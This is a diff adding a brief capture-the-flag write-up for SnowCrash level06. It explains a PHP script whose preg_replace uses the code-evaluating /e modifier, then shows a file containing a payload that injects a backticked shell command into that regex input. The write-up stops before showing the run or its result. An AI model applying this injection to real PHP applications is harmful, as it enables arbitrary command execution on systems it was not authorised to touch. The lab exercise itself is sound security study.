@@ -1,0 +1,13 @@
+level06@SnowCrash:~$ ls
+level06  level06.php
+
+we have an executable file and php code on it and we look into file
+we see that we have 2 function x and y. the function x get an a file from argv 
+and letter on it use it for regex
+
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+$a = preg_replace("/\[/", "(", $a); 
+$a = preg_replace("/\]/", ")", $a); 
+
+level06@SnowCrash:~$ cat /tmp/file
+[x ${`getflag`}]
